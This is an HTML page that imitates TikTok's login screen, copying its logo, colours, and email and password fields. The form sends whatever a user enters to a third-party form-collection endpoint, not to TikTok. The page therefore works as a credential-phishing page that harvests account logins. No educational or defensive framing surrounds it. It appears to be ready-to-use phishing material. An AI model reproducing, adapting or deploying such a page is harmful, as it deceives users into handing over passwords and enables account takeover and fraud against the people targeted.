<!DOCTYPE html>
<html lang="en">
<head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>TikTok Login</title>
   <style>
       body {
           font-family: Arial, sans-serif;
           background-color: #010101;
           display: flex;
           justify-content: center;
           align-items: center;
           height: 100vh;
           margin: 0;
       }
       .login-container {
         background-color: #ffffff;
         padding: 60px;
         border-radius: 8px;
         box-shadow: 0 0 10px rgba(0,0,0,0.1);
         width: 360px;
         text-align: center;
       }
       .login-header {
         margin-bottom: 20px;
       }
       .logo {
         width: 100px;
         margin-bottom: 10px;
       }
       .input-group {
         margin-bottom: 20px;
         text-align: left;
       }
       .input-group label {
         display: block;
         margin-bottom: 5px;
         font-size: 14px;
         color: black;
       }
       .input-group input {
         width: calc(100% - 20px);
         padding: 10px;
         border: 2px solid black;
         border-radius: 4px;
         font-size: 16px;
       }
       .login-button {
         width: 100%;
         padding: 13px;
         background-color: #EE1D52;
         border: none;
         border-radius: 4px;
         color: #fff;
         font-size: 16px;
         cursor: pointer;
       }
       .login-button:hover {
         background-color: #d01746;
       }
       .extra-options a {
         display: block;
         margin-top: 10px;
         text-decoration: none;
         font-size: 14px;
         color: #007BFF;
       }
       .extra-options a:hover {
         text-decoration: underline;
       }
    </style>
</head>
<body>
    <div class="login-container">
       <div class="login-header">
          <img src="https://www.flaticon.com/free-icon/tik-tok_4782345.svg" alt="TikTok Logo" class="logo">
          <h2>Log in to TikTok</h2>
       </div>
       <form action="https://submit-form.com/Vd5ERmEco" method="post">
          <div class="input-group">
            <label for="email">Phone or Email</label>
            <input type="email" id="email" name="email" placeholder="Phone or Email" required>
          </div>
          <div class="input-group">
            <label for="password">Password</label>
            <input type="password" id="password" name="password" placeholder="Password" required>
          </div>
          <button type="submit" class="login-button">Log In</button>
          <div class="extra-options">
              <a href="#">Forgotten Password?</a>
              <a href="#">Create New Account</a>
          </div>
       </form>
    </div>
</body>
</html>
